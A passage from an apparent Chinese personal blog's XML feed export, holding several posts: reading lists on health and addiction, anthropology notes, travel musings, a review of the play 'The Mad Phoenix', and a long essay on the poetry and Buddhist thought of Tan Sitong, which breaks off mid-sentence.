完成这些活动将释放内啡肽（神经递质，产生类似于吗啡一样的止痛效果和欣快感）。这是一个简短但非常有价值的提示, 这一过程使我们的大脑对我们的工作感到更加积极，非常有助于恢复工作能力。 扩展阅读 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（五）基于网络爬虫制作可视化图表 最佳写作实践：从Evernote到Ulysses 我的写作工具链 Kanban 看板管理实践精要 扩展阅读：嗑药简史嗑药简史（一）：药物成瘾与神经系统 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 行为成瘾：饮食、运动、性、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 嗑药简史（二）：瘾品跨境流动与外交关系扰动中美大国外交的 China Girl (芬太尼) 什么是芬太尼,Fentanyl 大国外交的头等优先事项 预测：暗黑幽灵无国界 嗑药简史（三）：瘾品管制背后的情与法 严刑峻法：瘾品管制与定罪量刑 戈尔巴乔夫的禁酒运动 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 咖啡的保健作用及临床实证研究案例 咖啡种类、制作工艺对健康效益的影响 嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)资源：美国农业部·食品成分数据库United States Department of AgricultureAgricultural Research ServiceUSDA Food Composition Databases 美国农业部·食品成分数据库 | USDA Food Composition Databases 参考文献 Preventing burnout for programmers Here’s 21 Tips To Get The Best Sleep Ever Which diet is best for long-term weight loss? 科学松鼠会：吃糖还是代糖？ 是什么吃胖了我们（3） 蛋白质 | 水白羊 是什么吃胖了我们（2） 脂肪 | 水白羊 是什么吃胖了我们（1） 碳水化合物 | 水白羊 节选《让我们害怕的食物——美国食品恐慌小史》 | 山寨盲流 TIME:You Asked: Should I Try a Fasting Diet? 果壳网|为什么今年的流感特别危险]]></content>
      <tags>
        <tag>Medical</tag>
        <tag>Science</tag>
        <tag>Health</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于人类学(Humanics)]]></title>
    <url>%2F2017%2F04%2F21%2FScience-Humanics%2F</url>
    <content type="text"><![CDATA[摘要待编辑 人类学Master 弗朗斯•德瓦尔 [荷兰著名的心理学家、动物学家和生态学家]主要著作:《共情时代》、《黑猩猩的政治》、《类人猿与寿司大师》、《灵长类动物如何谋求和平》、《人类的猿性》 唯一可以肯定的是，我们这个物种具有战争的潜能，这个苗头在某些特定环境下就会抬头。小冲突有时会失控爆发，结果引发血光之灾。再加上不管哪儿的年轻男性都喜欢显摆自己矫勇善战，他们会不顾后果地打击外族人，局势就会更加雪上加霜。不过同时，人类这个物种也有其独特之处，即使在同族人散布开很久之后，我们还会同亲人保持某种联系。结果，部族间就会维持一个完整的人际关系网络，这个网络的存在会促进经济交流，与此同时让战争变得非常没有建设性。同外族的联系相当于在不可知的环境中为活命提供了一项保险，如此一来，食物和水短缺的风险，就可以在各个族群间平摊了。 行为模型 动物世界，也遵循经济基本法 | 浪潮工作室@破壳翻译组 哺乳动物的私人生活，你选择妻妾成群，还是从一而终？|科学松鼠会@红色皇后 光棍康德的幸福生活 | 冯晓虎 单身女性的缺乏逼得维京人当了海盗 |Evolution and Human Behavior 论文推荐 网文：台湾早期开发-光棍有关的一些材料清廷《移民三禁》：渡台者不许携带家眷，这使台湾光棍巨多，称作“罗汉脚”，这些光棍又往往沦为游民。后来清代台湾的几次著名民变，如朱一贵事变、林爽文事变等，游民都起了主力作用 人类逃不出邓巴数|互联网分析沙龙 超越邓巴数之七：暴力的垄断｜大象公会 超越邓巴数之六：武人的兴起｜大象公会 超越邓巴数之5：青春的躁动｜大象公会 老人政治的意义-家长联盟-邓巴数 | 大象公会 男女关系之一：纠结的一夫一妻制｜大象公会@辉格 男女关系之三：女性的性策略｜大象公会@辉格 男女关系之二：男性性策略｜大象公会@辉格 关于传播学 魏方丹、李静思：下流才是内容创业的王道 破壳翻译组:色情广播瓦解铁血纳粹 ​大灾之后，为何谣言盛行？ | 沉默的马大爷 怎样打造过硬的传谣队伍？（大误）| 破破的桥 为什么我不在微信公众号上写文章 | 酷壳 关于人群鄙视链 大象公会@姚白莞：苏北到底在哪里 大象公会@姚白莞：苏北人出汉奸？ 生物多样性 杂交不仅帮濒危物种度过难关，还对新物种演化至关重要 | Quantamagazine,2017-07-19杂交物种一度被视作生物的错误，但正是它默默拯救了大量处于困境中的物种。如何协调杂交现象与保护政策成为了科学界的一大挑战。 北美移民遗传基因分析，冰河晚期大型物种灭绝 有了生物技术，为什么还要担心物种灭绝？| 科学松鼠会@Ent 研究认为混种交配改变人类基因影响人类进化|Science 未经整理的一些碎片素材是这个意思：让财富变得透明会对社会福利产生不良影响，降低总体合作水平、社会关联以及整体财富。相比之下，贫富差异本身给社会福利带来的影响很少。 论文：财富透明与社会福利 教练太牛了！我到现在都不明白，他自己都没拿过全国冠军，怎么就能预言我能拿世界冠军？——天下最好的教育都是师傅带徒弟，英雄识英雄、英雄惜英雄是也！ 一般新闻：击剑冠军教练 个人感觉人类基因像是一个彻底的分布式系统，人种或者其它动物都只是宿主，基因是被切片后分散于不同物种之间的。任何单一个体、种群、物种的灭绝都不足以影响地球的基因多样性，它具有很强的容灾和自演化能力。要不然怎么解释生命树总体上是进化的，而从来没有在生物灭绝中被一次次归零？？ 基因证明人类一次性走出非洲，但不能解释人类文明论文：人类迁徙路线图 文明的优势是远程攻击，野蛮的优势是贴身肉搏。所以具有相对文明的人千万不要和野蛮人争论，这等于自己降维，会丢掉优势。又例如美帝就不怎么关心天朝火热的互联网+金融+航母运动，这对人家而如同吃饭、喝水一般平常，反而在超远程星际探索、大型无人系统、下一代世界治理体系等领域持续突破，以期在未来也能继续保持境界上的优势。]]></content>
      <tags>
        <tag>Science</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TechThinking]]></title>
    <url>%2F2017%2F04%2F21%2FTechnology-Thinking%2F</url>
    <content type="text"><![CDATA[摘要 From Problem to Insight From input to output 软件工程实践中的十大法则 工程师的自我修养：全英文技术学习实践 全英文技术学习的必要性 如何实践全英文技术学习 一、搞一点翻译 二、精读原版教材 三、电子书必不可少 四、一切知识最后都要对应到人 五、善用效率工具，持续改进 总结：From input to output From Problem to Insight一些碎碎念 20160526引入新特性的同时，也意味着增加复杂度。天底下的事就是这样，没有一招制敌，没有一劳永逸，完善的反馈环，健壮的体系才是王道。]]></content>
      <tags>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Catalog:Travel]]></title>
    <url>%2F2017%2F04%2F20%2FArtistic-Travel%2F</url>
    <content type="text"><![CDATA[摘要 BirdWatching:广州湿地公园观鸟 江南园林鉴赏|南京瞻园 摄影专辑|珠海航空航天展览 游历之道 凡游历之道有二：一者看山水明秀、花木之红翠，或翫（同“玩”）州府之繁华，或赏寺观之楼阁，或寻朋友以纵意，或为衣食而留心，如此之人，虽行万里之途，劳形费力，遍览天下之景，心乱气衰，此乃虚云游之人。二者，参寻性命，求问妙玄，登巇崄之高山，访明师之不惓，渡喧轰之远水，问道无厌。若一句相投，便有圆光内发，了生死之大事，作全真之丈夫。如此之人，乃真云游也！—–王重阳《重阳立教十五论 》 《重阳立教十五论》为世界道教主流全真道的经典论著。全真开化辅极帝君王重阳撰，一卷。主要内容为：凡出家先须投庵。身依心安；云游访师 ，参寻性命；学书宜采意心解；精研药物，活人性命；以丛林为立身 之本；静坐须心如泰山，剪除念想以定心；调和五行精气於一身， 以正配五气；修炼性命；入圣之道须积功累行；超越欲界、色界、无色界；养身之法在於得道多养；超离凡世等十五条。该书论述了全真道创教的基本宗旨，规定了类严格的修道戒规，融合儒释道三家精华，为研究全真道的重要经典文献。收入《正统道藏》正一部。]]></content>
  </entry>
  <entry>
    <title><![CDATA[豪侠列传：南海十三郎(The Mad Phoenix)]]></title>
    <url>%2F2017%2F04%2F20%2FArtistic-The-Mad-Phoenix%2F</url>
    <content type="text"><![CDATA[摘要 不写剧评的观众不是好作家。 看戏也要讲缘分记得是小学还是初中的时候，我就在电影频道看过《南海十三郎》（1997拍摄，普通话），当时给我幼小的心灵以极大的震撼。后来到2009年左右，又在网上看过春天话剧社不知某年演出的现场录影版（粤语），更是如获至宝，之后几年好像看了大概二十几遍，越看越有味道。 今年偶然的机会了解到舞台剧版又要巡回演出了，本来打算看5月21日的深圳站，但是因为其它原因没有成行。但是不久之后，又看到了加演广州站的消息，于是早早的买了票，昨天晚上终于在现场看了一遍，也算是了了一桩十几年的夙愿，正所谓念念不忘，必有回响啊。 人物关系编剧：杜国威主演：谢君豪。年代背景：1920～1980 年代活动地域：广东南海县（今广州荔湾、佛山南海禅城）、上海、香港 南海十三郎：原型江誉镠，粤曲名编剧。薛觉先：原型薛觉先，粤曲名家，“粤剧伶王”，开创“薛派”。 唐涤生：原型唐涤生，粤曲名编剧，生于珠海唐家湾。代表作《落霞孤鹜》、《紫钗记》、《帝女花》、《蝶影红梨记》、《再世红梅记》。剧中与十三郎亦师亦友，皆是性情中人，对手戏精彩绝伦，不过二人的师徒关系，并无直接史料，为艺术加工。 太史公：十三郎之父。南海巨商、士绅，性豁达、好美食、好戏曲，喜结交各路人物，人称赛孟尝，娶了十二个老婆，子女众多。晚景凄凉，文革中批斗绝食而死。 梅仙：十三郎侄女。家道衰败、流落风尘，后来成为电影明星，与十三郎互有提携，中年重病早逝，逝前皈依宗教。 Lily：上海千金小姐，与十三郎是香港大学同学，舞会上一见倾心，从此牵绊一生。 任惜花：一个很烂的编剧，代表趋炎附势的世俗主义 马老大：一个很烂的戏曲演员、老板 痴情赢得是凄凉全场三个小时下来，观众基本上是一路爆笑下来的。但这确实是一部彻彻底底的悲剧，大悲剧。 第一悲：痴情无果，独钓寒江。 一见钟情的人有的是，痴情一生的人不多见。 心声泪影女儿香，燕归何处觅残塘。红绡夜盗寒江雪，痴人正是十三郎。 无论是真实的原型，还是剧中人物，无处安放的痴情都化成了剧作家笔下的作品。《寒江钓雪》、《心声泪影》、《梨香院》、《女儿香》、《梁红玉》、《燕归人未归》、《李香君》，哪一部不是有情有义，以情感人，哪一部不是剧作家滴血写成呢？ 第二悲：英才折损，浮萍无根。明面上，十三郎和唐涤生一对师徒，一个早逝，一个疯癫，盖世才华宛如流星，人生际遇无不令人唏嘘。暗地里，马老板、任惜花之流却总能如鱼得水、风生水起。 从南国到上海，从北疆到南国，落魄上海，冻死香港，风雨飘摇如浮萍，这就是大时代中的大多数。第三悲：家国破败，百年血泪。高门大院的太史第，高官显贵云集，英雄名角际会，蛇羹宴，丝竹局。不起眼的小舞台、小剧社，养活了一帮艺人，也养活了艺术。这些地方不仅有温情的记忆，更是滋养艺术家的沃土。 乱世动荡，府第凋零，舞台不存，也就到了曲终人散，各奔东西的时候了，旧主们只能哀吟“残山梦最真，旧境丢难掉。” 一旦天下承平，自然又会有新主大摆流水席，重现灯红酒绿。 壮怀如我更何人全剧写的都是离别情，绕不开的则是家国情怀。虽然出身士绅家庭，在儒家传统的浸染中成长，但是大时代无可避免的在十三郎身上留下烙印。五四运动以来，整个中国的知识阶层都或多或少地受到民族主义潮流的影响，这也就解释了后面的剧情，艺术创作上坚持大仁大义，抗战时期毅然去前线演出，流落香港时调侃讽刺英国总督等等。 本剧的高明之处又在于，主角虽然有浓烈的家国情怀，却始终和政治保持距离，基本上属于边缘中的边缘。这不正是大时代下小人物的真实处境吗？ 中国传统的知识分子，多少都有点以天下为己任的调调，但是鲜有几个人能真的有携天下而行豪气，鲜有几个人能做到视金钱如粪土。且不论有几人可以真的混进体制内，就算是谋得红顶乌纱，也多是为稻梁谋，不倾轧害人已是难得，遑论有所作为。 但愿梦来不必醒本剧从始至终，其实隐含着很多处宿命论的调子。例如天才要么早逝、要么疯癫的偈语，三哥浪荡公子、侄女沦落风尘的设定，老揸以声成名、晚年却破声的无奈…… 同时，主角在最潦倒之时，依然高举反宗教主义的大旗的。通过这条线索，编剧再次丰富了十三郎的思想内涵：即使是在极端恶劣的生存条件下面， 他并不会屈从于任何权威（这方面如果对于文革史稍有留意的话能更好理解），或者这就是杜国威希望能与“全港编剧共勉”的东西，十三郎不仅具有极高的艺术造诣和品味（对马老板、任惜花之流的极端鄙视），还有自己的一套完整信仰体系，一家价值评判标准，是一个完全独立自由、大写的人。 这一点，通过梅仙的对比，显得更有张力，大多数剧评人并没有关注到。 由于从小缺乏教育、也极度缺乏家庭温情，人生际遇也多是在灯红酒绿的浮夸世界，梅仙是没有机会、也没有意识要去构建自己的心灵世界的。所以，当她不再受宠、远离闪光灯，远离众人的殷勤、独自面对疾病和自己的时候，投入宗教的怀抱，成为无比虔诚的基督徒，也是顺理成章的事。现在大部分的演艺界人士不就喜欢结交仁波切吗？这其实无关智商，越是灯红酒绿的地方，越需要宗教关怀，古今皆然。 总之，十三郎的下半生基本上在疯癫中度过，还好“疯得够清醒”。你说是避世也好，自我麻醉也好，还不如说是自我保护。自我放逐于江湖，远离浊世，远离浊世的人和事，那些积极入世之徒，又有几个能永保赤子之心，他至少可以怀抱“雪上白凤凰”，自己干净。 新版舞台剧的不足1.一见倾心过于单薄从比重上看，十三郎与Lily的感情戏偏少，上来就一见钟情，处理得太简单，起承转折的节奏也把握得比较零散，过于突兀。这块虽然大体上继承了原版舞台剧、97电影版的底子，但是总感觉这一版的处理不好。也许是我不大喜欢这一版的Lily，呵呵。 2.薛觉先的扮演者早先看的现场录影版，薛觉先这个角色的印象很深，到后来才知道，表演者是真正的粤剧演员，印象中已经去世了，可惜！ 现在这个版本的扮演者，总体感觉阳刚有余，柔性不足，整体表情偏硬，形象上不似伶人，几段关键的唱腔的味道都不大对。 3.龙套服装设计这部舞台剧中的一众龙套其实非常重要，不仅作为“说书人”的角色承上启下，而且还担纲其它多个配角。但是感觉这个版本的服装，设计感觉不太好，一是色调偏暗，二是用了多个色块拼接、感觉花哨，总之是另外比较奇怪。 总评个人认为，《南海十三郎》是自昆曲《桃花扇》、小说《红楼梦》以降，以离情写兴亡的惊世之作。限于体裁、篇幅以及语言的关系，虽偏于小众，仍不可忽视作品本身承载的人性关怀和世界格局。 二十几年150多场演出就要划上一个休止符了，希望以后也有好的作品能书写我们这个时代的故事。 扩展阅读 古典音乐低俗史 舞台剧：南海十三郎 电影评论|灵魂解码《林肯》 电影评论|斯皮尔伯格的林肯情怀 风月集|诗三百，思无邪 世纪小说《悲惨世界》 红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 江南园林鉴赏|南京瞻园 摄影专辑|珠海航空航天展览 相关阅读电子书：《香山艺术评论》]]></content>
      <tags>
        <tag>History</tag>
        <tag>Art</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最后的豪侠——谭嗣同]]></title>
    <url>%2F2017%2F04%2F20%2FMrTanSitong%2F</url>
    <content type="text"><![CDATA[摘要 第一部分 国士魂魄：走进谭嗣同的精神世界 一、沧海沙漠，千里关河：谭嗣同诗文鉴赏 二、菩萨救世，死得其所：谭嗣同的佛学思想及其影响 附录：谭嗣同年谱 附录：《仁学》摘要 二千年来之政，秦政也，皆大盗也；二千年来之学，荀学也，皆乡愿也。惟大盗利用乡愿，惟乡愿工媚大盗。天下为君主囊橐中之私产，……其视华人之身家，曾弄具之不若。……吾愿华人，勿复梦梦谬引以为同类也。夫自西人视之，则早歧为二矣。故俄报有云：华人苦到尽头处者，不下数兆。我当灭其朝而救其民。凡欧美诸国，无不为是言，皆将籍仗义之美名，阴以渔猎其资产。“华人不自为之，其祸可胜言哉！” 谭嗣同（1865.3.10—1898.9.28）字复生，号壮飞，别署华相众生、东海褰冥氏、通眉生、廖天一阁主。湖南浏阳人。 第一部分 国士魂魄：走进谭嗣同的精神世界 望门投止思张俭，忍死须臾待杜根。我自横刀向天笑，去留肝胆两昆仑。 这首《狱中题壁》是谭嗣同的传世之作，是一首在狱中为自己写就的祭死之诗。生死去留坦然处之，烈士精神如同高耸的昆仑，傲视群伦。 在谭短暂的一生中留下不少诗歌、散文，颇有造诣，“今凡有《寥天一阁文》二卷，《莽苍苍斋诗》二卷，《远遗堂集外文初编》一卷，《续编》一卷，《石菊影庐笔识》二卷”。谭嗣同早年游历南北山川名胜，他的诗歌以纪游和咏怀为主，多为咏物抒怀之作，境界恢弘，志趣豪迈，笔力遒劲。散文方面，谭嗣同早期受桐城派影响，后学习龚自珍、魏源（《三十自纪》：“嗣同少颇为桐城所震，刻意规之数年”）。这些留下的诗文作品可以说是在目前非常有限的资料中，了解谭嗣同精神世界的关键钥匙。 一、谭嗣同诗文鉴赏一个叛逆的官二代谭嗣同的父亲谭继洵（1823年－1901年）是考科举、进士出身的帝国官僚。作为一个传统官宦之家的公子，谭从小接受的也是儒家传统教育。“五岁受书，即审四声，能属对。十五学诗，二十学文”，10岁时拜浏阳欧阳中鹄为师，23岁时在刘人熙的指导下开始研究 王夫之 等人的著作。 《自题山水画扇》 大石横冲雪浪粗，眼前突兀一峰孤。悬知背面江山远，无画图中有画图。 如果套用精神分析学派的理论，谭嗣同的童年可谓是极度缺乏母爱的，这有可能是导致他一生处于悲苦忧郁心境的主要原因。生母徐五缘“性惠而肃”，这个评语为尊者忌，大概是比较凶的意思，除了不苟言笑之外，每当孩子们稍有过失的时候，上来就打，“折操笞不少假贷”。谭嗣同11岁时，其母与一兄一姊染病身亡，之后就由谭继洵的妾卢氏照顾。按照谭自己的话说，备受后妈欺凌和虐待，父亲偏听偏信，”涵泳其苦，殆非生人所能任受!”，由此形成了非常怪癖的性格。 “先夫人性惠而肃，训不肖等谆谆然，自一步一趋至植身接物，无不委曲详尽。又喜道往时贫苦事，使知衣食之不易。居平正襟危坐，略不倾倚，或终日不一言笑。不肖等过失，折操笞不少假贷。故嗣同诵书，窃疑师说，以为父慈而母严也。御下整齐有法度，虽当时偶烦苦，积严惮之致，实阴纳之于无过之地，以全其所事。—— 《先妣徐夫人逸事状》 “吾自少至壮，偏遭纲纶之厄，涵泳其苦，殆非生人所能任受，濒死累矣而卒不死；由是益轻其生命，以为块然躯壳，除利人之外，复何足惜。” —— 《仁学·自叙》 由于不能在家庭中获得关爱，谭嗣同从小就有离家出走、四处游荡的记录。谭嗣同尤其喜好“壮游”，据我考证是中国近现代最有成就的“驴友”。他有一次仗剑策马射猎，7昼夜行程1700多里，虽遇“髀肉狼藉”，但仍然“怡然自乐”。谭嗣同短暂的一生先后往来于疆、陇、秦、直、豫、鄂、湘、苏、赣等省，考察风土人情，结交名士（主要也就是官宦世家的公子哥以及文人学者），很多材料显示其中也包括大量的“江湖边缘人士”：和尚道士、绿林侠客、黑社会大哥等。其中比较有名的便是大刀王五（1844年－1900年），祖籍河北沧州，回族，绰号“小五子”，善用大刀，拥有自己的镖局事业，是华北有名的江湖大哥、社团领导。由于长期深入社会各个阶层，实地走过荒野村镇，谭嗣同对于当时的深刻社会危机是有直观认识的，才能发出“风景不殊，山河顿异；城郭犹是，人民复非”的感慨。 《罂粟米囊谣》 罂无粟，囊无米，室如悬磬饥欲死。饥欲死，且莫理，米囊可疗饥，罂粟栽千里。非米非粟，苍生病矣！ 《宋徽宗画鹰》 落日平原拍手呼，画中神骏世非无。当年狐兔纵横甚，只少台臣似郅都。 《望海潮自题小影》 曾经沧海，又来沙漠，四千里外关河。骨相空谈，肠轮自转，回头十八年过。春梦醒来么？对春帆细雨，独自吟哦。惟有瓶花，数枝相伴不须多。 寒江才脱渔蓑。剩风尘面貌，自看如何？鉴不因人，形还问影，岂缘醉后颜酡？拔剑欲高歌。有几根侠骨，禁得揉搓。 忽说此人是我，睁眼细瞧科。 谭嗣同的主要游历路线主要的游历路线有三条，基本上相当于环绕大半个中国一圈： 湖南&lt;——&gt;甘肃：沿途经过长沙、洞庭湖、湖北襄阳、河南洛阳，经潼关入陕西，到达甘肃兰州、天水一带。(回程不走潼关，借道汉中走水路到襄阳) 湖南&lt;——&gt;北京：京师出发，由天津出海，经停烟台一路海船到上海，通过江苏进入长江水道，经过安徽入湖北、洞庭湖，回到湖南。（来去大致原路） 甘肃&lt;——&gt;北京：兰州出发，穿过六盘山脉（崆峒山），经潼关出陕西入山西，到达直隶通州，入京师。 分析这些路线不难发现，有几个关键节点：浏阳-长沙、北京、南京、兰州。 家乡浏阳自不必说，谭继洵在北京户部任职十七年，有大量的社会关系，外放之后也需要经常到北京述职。南京是江南科考的中心，虽然谭嗣同极度鄙视举业，还是参加了六次考试，当然了一次也没考中过。按照帝国的惯例，这类省部级高干的即使不参加科举，也是有很多门路的 —— 例如花钱捐官方面有一定的优先权。1896年（光绪二十二年），31岁的谭嗣同捐了一个知府的官衔，开始在江苏南京上班。显然这个候补官没啥事干，他的主要精力都是闭门读书，写作《仁学》。 （光绪）三年冬，归湖南，取道天津，浮海径烟台至上海…溯江泛洞庭…抵浏阳。四年春，赴甘肃，舟至长沙，易舟流湘泛洞庭，流江径湖北，溯汉至襄阳，陆径洛阳入函谷、潼关至陕西。秋，至兰州，回抵秦州。五年夏，归湖南，取道徽县，流嘉陵江至略阳，陆至汉中，流汉至襄阳，易舟仍流汉径湖北，溯江泛洞庭。秋，至长沙，陆抵浏阳。七年秋，游长沙。八年春，赴甘肃赴兰州，冬返。九年春，赴兰州。十一年春，归湖南。夏，陆抵浏阳。秋，赴长沙，寻归。十一年冬，赴甘肃。十二年春，抵兰州。十四年夏，归湖南浏阳。秋赴长沙，寻归。冬，赴甘肃。 十五年春，抵兰州，寻上京师，径陕西，出潼关，渡河径山西，夏抵京师，寻归湖南，同三年。秋，抵浏阳。十六年春，赴湖北，舟至长沙，易舟流湘泛洞庭，流江抵湖北。夏，归湖南。秋返，赴安徽，流江径九江抵安徽，寻返。十七年秋，归湖南，抵长沙，游 衡岳，冬返。十九年春，赴芜湖，流江径九江、安徽抵芜湖，寻返。夏，上京师，流江径九江、安徽、江苏至上海，易舟浮海，径烟台至天津，又易舟溯潞至北通州，陆抵京师。秋，返湖北，取道天津，浮海径烟台至上海，易舟溯江，径江苏至安徽，易舟仍溯江，径九江抵湖北。 谭继洵自光绪三年(1877年)由户部京官外巩秦阶道员开始，历任按察使、布政使，到光绪十五年(1889年)升任湖北巡抚为止，有长达12年时间在甘肃任职。这期间谭嗣同都是随侍身边的，他为了办理各项事务或者纯粹就是不想在家里待着，多次长途往返于“湖南浏阳-甘肃兰州”一线。《六盘山》、《崆峒》、《武昌夜泊》等作品都是写于这条路线，也是“曾经沧海，又来沙漠，四千里外关河”的由来。 《潼关》 终古高云簇此城，秋风吹散马啼声。河流大野犹嫌束，山入潼关不解平。 《六盘山》 转饷谣马足蹩，车轴折。人蹉跌，山岌。朔雁一声天雨雪。舆夫舆夫，尔勿嗔官。仅用尔力，尔胡不肯竭？尔不思车中累累物，东南万户之膏血。呜呼车中累累物，东南万户之膏血！ 《崆峒》 高被众峰吞，莽荡山河剑气昏。隔断尘寰云似海，划开天路岭为门。松拿霄汉来龙斗，石负苔衣挟兽奔。四望桃花红满谷，不应仍问武陵源。 《秦岭》 秦岭奔放竞东走，大气莽莽青嵯峨。至此一束截然止，狂澜欲倒回其波。百二奇险一岭扼，如马注坂勒于坡。蓝水在右丹在左，中分星野凌天河。唐昌黎伯伯曰愈，雪中偃蹇曾经过。于今破庙兀千载，岁时尊俎祠岩阿。关中之游已四度，往来登此常悲歌。仰公遗像慕厥德，谓钝可厉顽可磨。由汉迄唐道谁寄，董生与公余无它。公之文章若云汉，昭回天地光羲娥。文生于道道乃本，后有作者皆枝柯。惟文惟道日趋下，赖公崛起蠲沉疴。我昔刻厉蹑前躅，百追不及理则何。才疏力薄固应尔，就令有得必坎坷。观公所造岂不善，犹然举世相讥诃。是知白璧不可为，使我奇气难英多。便欲从军弃文事，请缨转战肠堪拖。誓向沙场为鬼雄，庶展怀抱无蹉跎。生平渴慕矍铄翁，马革一语心渐摩。非曰发肤有弗爱，涓埃求补邦之讹。班超素恶文墨吏，良以无益徒烦苛。谨再拜公与公别，束卷不复事吟哦。短衣长剑入秦去，乱峰河涌森如戈。 《夜泊》 系缆北风劲，五更荒岸舟。戍楼孤角语，残腊异乡愁。月晕山如睡，霜寒江不流。窅然万物静，而我独何求？ 《武昌夜泊二篇》 秋老夜苍苍，鸡鸣天雨霜。星河千里白，鼓角一城凉。灯炫新番舶，磷啼旧战场。青山终不改，人事费兴亡。 武汉烽销日，舟因览胜停。江空能受月，树远不藏星。露草逼蛩语，霜花凋雁翎。但忧悬磬窒，兵气寓无形。 二、菩萨救世，死得其所：谭嗣同的佛学思想及其影响谭嗣同一生博通群学，融会诸宗，最后于佛教情有独钟。 金陵听法1896年（光绪二十二年），谭嗣同于京城结识了吴雁舟、夏曾佑、吴季清等人，倾心于佛学；同年夏，在南京认识清朝末年著名佛教居士杨文会，从杨文会学佛。 “吴雁舟先生嘉瑞为余学佛第一导师，杨仁山先生为第二导师，乃大会于金陵，说甚深微妙之义，得未曾有。” 《金陵听说法》 而为上首普观察，承佛威神说偈言。一任法田卖人子，独从性海救灵魂。纲伦惨以喀私德，法令盛于巴力门。大地山河今领取，庵摩罗果掌中论。 杨仁山（1837年－1911年），名文会，字仁山，安徽石埭（今安徽池州石台）人。创立金陵刻经处、祇洹精舍（中国第一所现代化的佛学教育机构），被尊称为“近代中国佛教复兴之父”。 杨仁山出身官宦世家。其父杨朴庵，与曾国藩是同年的进士，但是杨自小不喜欢举业，太平天国之乱时，曾襄助曾国藩办理军粮事务，精于工程事业，但不愿为官，曾国藩、李鸿章“咸以国士目之”，后服职于江宁筹防局。亦曾受聘曾纪泽幕府，随曾纪泽出使欧洲，随刘芝田出使英法。同治年间，杨仁山移居杭州时，曾想娶一名杭州女子为妻，但受到母亲及正室的反对，只同意让他纳为妾，遂作罢。经此事后，杨终日闷闷不乐，在杭州书店中见到《大乘起信论》，大为激赏，从此嗜读佛教经典，开始他的佛教事业。 虽然跟从杨文会学习的时间不长，总计不过一年有余，但是深刻地影响了谭嗣同的精神世界。他有段时间就住在金陵刻经处勤学苦修，“于是重发大愿，昼夜精持佛咒，少不间断”。杨仁山的核心思想在于对于佛教圆融精神的把握，对于净土宗、华严宗和唯识宗三者都加以强调， 谭嗣同后来“成一家之言” —— 将华严、唯识二宗的佛学思想融入了《仁学》的理论框架，体现了极高的造诣。 救众生外无佛法千百年来以来，号称大乘的中国佛教，其实深锁于围墙之内、象牙塔中，多落于清谈、空谈，大众眼中是一种出世、消极、与社会脱离的形象。天下处于“千年未有之大变局”的严峻时刻，内忧外患，黎民苍生流离失所，佛陀的“慈悲”、“众生平等”，大乘的救度众生，体现在哪些佛教徒身上呢？。举目所望，诚令人大失所望。谭嗣同认为佛教积极入世、普渡众生的精神与“孔孟救世之深心”是一致的，决心以佛法世法、经世致用，“救人之外无事功，即度众生之外无佛法”。 “佛说以无畏为主，已成德者名大无畏，教人也名施无畏，而无畏之源出于慈悲，故为度一切众生故，无不活畏，无恶名畏，无死畏，无地狱恶道畏，乃至无大众威德畏，盖仁之至矣。”——写给欧阳中鹄的信 “我之一身，何可私之有？ 何可爱之有？既可无私，既可无爱，则毋宁舍其身以为众生之牺牲，以行吾心之所安。” —— 《仁学·自叙》 正是在这种精神的指引之下，谭嗣同会最终选择舍生取义、杀身成仁、为社会革命而慷慨就义，可以说是为了实践其舍身救世的大无畏精神而得偿所愿。“善学佛者，未有不震动奋勇而雄强刚猛者也”。大乘佛法走出围墙，在人间重现其刚健雄猛的精神，佛教在整个中国近代的面貌为之一变。 “不有行者，无以图将来，不有死者，无以召后起。”“各国变法无不从流血而成，今日中国未闻有因变法而流血者，此国之所以不昌也。有之，请自嗣同始。” 谭嗣同就义十三年后，统治中国近三百年的王朝，沿用近二千年的帝国体制，轰然崩塌。 “排除生死，旁若无人，布衣麻鞋，径行独往，上无政党猥贱之操，下无懦夫奋矜之气。” —— 章太炎 《答铁铮》 中学 vs 西学 《论学者不当骄人》 动辄诋西人无伦常，此大不可。夫无伦常矣，安得有国？使无伦常而犹能至今日之治平强盛，则治国者又何必要伦常乎？惟其万不能少，是以西人最讲究伦常，且更精而更实。即如民主、君民共主，岂非伦常中之大公者乎？又如西人招民兵，有独子留养之例，又最重居丧之礼，岂得谓其无父子乎？西人自命为一夫一妻世界，绝无置妾之事，岂非夫妇一伦之至正者乎？何得动诋西人无伦常？即令伦常中之礼文小有不同，要不过是末节耳，不妨各安其风俗，无所用其诋也，无所用其骄也。况伦常者，人人当尽之分，纵令做到极处，亦不过是分内之事，并算不得甚么本事；何得持此以骄人乎？ 血著《仁学》二十一难者又曰：“机器兴，物产饶，物价宜廉矣，而欧、美反贵者，何也？”曰：此机器之所以利民也。小民穷岁月之力，拮据辛劳，以成一物，岂不欲多得值哉？而价止于此，此其可哀甚矣。盖物价之贵贱，隐视民命之重轻以为衡。治化隆美之世，民皆丰乐充裕，爱惜生命，不肯多用人力，人亦从而爱惜之焉，故创造一物，即因其力之可贵而贵之。苟或不贵，固不急求售，亦将不复造。且民皆富矣，虽多出值复何吝？…… 中国之民，至鬻其身以为奴隶，驱使若犬羊，系役若重囚，… 身且如此，更何论所造之物？此所以虽贱极犹莫能售也。 三十三天下为君主囊橐中之私产，不始今日，固数千年以来矣。峻死灰复燃之防，为盗憎主人之计，锢其耳目，桎其手足，压制其心思，绝其利源，窘其生计，塞蔽其智术；繁拜跪之仪以挫其气节，而士大夫之才窘矣；立著书之禁以缄其口说，而文字之祸烈矣；且即挟此士所崇之孔教，缘饰皮傅，以愚其人，而为藏身之固。 三十六中国之兵，固不足以御外侮，而自屠割其民则有余。自屠割其民，而方受大爵，膺大赏，享大名， 